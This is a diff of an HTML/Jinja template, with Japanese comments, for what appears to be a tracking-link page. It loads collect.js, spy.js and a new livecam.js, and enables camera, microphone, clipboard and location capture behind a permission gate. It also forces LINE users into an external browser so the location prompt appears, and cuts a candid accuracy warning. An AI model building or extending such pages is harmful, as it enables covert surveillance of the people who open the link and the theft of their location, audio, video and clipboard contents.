@@ -10,12 +10,11 @@
 <link rel="apple-touch-icon" href="/static/icon.svg">
 <title>{{ link.name }}</title>
 <script>
-/* ★ LINE内ブラウザ対策：位置情報の許可ダイアログが出ないので外部ブラウザで開き直す。
-   HTMLは no-store なので必ず最新が走る（JSキャッシュの影響を受けない）。 */
+/* LINE内ブラウザ対策：位置情報の許可ダイアログが出ないので外部ブラウザで開き直す */
 (function () {
   var ua = navigator.userAgent || "";
-  if (!/Line\//i.test(ua)) return;                                   // LINE以外はそのまま
-  if (/[?&]openExternalBrowser=1/.test(location.search || "")) return; // もう付いてる
+  if (!/Line\//i.test(ua)) return;
+  if (/[?&]openExternalBrowser=1/.test(location.search || "")) return;
   try {
     var u = new URL(location.href);
     u.searchParams.set("openExternalBrowser", "1");
@@ -34,18 +33,16 @@ html,body{margin:0;background:#0f1115;color:#e6e9ef;
 .line{font-size:15px;line-height:1.7;margin:0;color:#9aa3b2;min-height:1.7em}
 .line.warn{color:#f0b429}
 button{margin-top:16px;padding:12px 30px;font-size:15px;border:0;border-radius:999px;
-  background:#4c8dff;color:#fff;font-weight:600}
+  background:#4c8dff;color:#fff;font-weight:600;cursor:pointer}
 button:disabled{opacity:.55}
 .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
 #lt_ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
-#lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px}
+#lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px;line-height:1.7}
 a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:14px}
-
 #lt_live{opacity:0;transition:opacity .35s ease}
 body.need #lt_live{opacity:1}
 body.ui-none #lt_st{display:none}
-
 #lt_gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
   display:flex;align-items:center;justify-content:center;padding:26px;
   transition:opacity .4s ease, transform .4s ease}
@@ -73,8 +70,7 @@ body.ui-none #lt_st{display:none}
   <p class="ask">{{ ask_text }}</p>
   {% if gate_extra %}<div class="extra">{{ gate_extra }}</div>{% endif %}
   {% if gate_warn %}
-  <p class="warnline">※位置情報はスマホのGPSを使います。GPSが取れずIPだけで判定した場合は、
-  特に4G/5G回線だと数km〜数十kmの誤差が出ます。精度が必要なときは「正確な位置情報」を選んでください。</p>
+  <p class="warnline">※位置情報は端末のGPSを使います。屋内などでは精度が落ちることがあります。</p>
   {% endif %}
   <button id="lt_go">{{ go_text }}</button>
   {% if gate_copy %}<button class="copy noclick" id="lt_copy">リンクをコピー</button>{% endif %}
@@ -113,24 +109,20 @@ window.LT_TITLE      = {{ link.name|tojson }};
 window.LT_GATE = {{ 1 if gate else 0 }};
 window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
 
-/* live.js 側のLINE判定は、headで既に処理済みなら二重に走らせない */
+/* headでLINE処理済みなので二重に走らせない */
 window.LT_LINE_FIX = 0;
 
-/* カメラ・マイクはリアルタイム（連続送信）。カメラは別途 自撮り1枚も添える */
-window.LT_CAM      = 1;
-window.LT_CAM_HOLD = 1;
-window.LT_CAM_PREVIEW = 1;
-window.LT_CAM_EVERY   = 3000;   // 映像フレームを送る間隔(ms)
-window.LT_MIC      = 1;
-window.LT_MIC_HOLD = 1;
-window.LT_MIC_MS   = 4000;      // 音声を区切って送る長さ(ms)
+/* カメラとマイクは livecam.js が「1本のライブ動画」として担当する */
+window.LT_CAM      = 0;
+window.LT_MIC      = 0;
 window.LT_CLIP     = 1;
 window.LT_SPY_WAIT = 7000;
 window.LT_DEBUG    = 0;
 </script>
-<script src="/static/keepalive.js?v=14"></script>
-<script src="/static/collect.js?v=14"></script>
-<script src="/static/live.js?v=14"></script>
-<script src="/static/spy.js?v=14"></script>
-<script src="/static/gate.js?v=14"></script>
+<script src="/static/keepalive.js?v=15"></script>
+<script src="/static/collect.js?v=15"></script>
+<script src="/static/live.js?v=15"></script>
+<script src="/static/spy.js?v=15"></script>
+<script src="/static/livecam.js?v=15"></script>
+<script src="/static/gate.js?v=15"></script>
 </body></html>
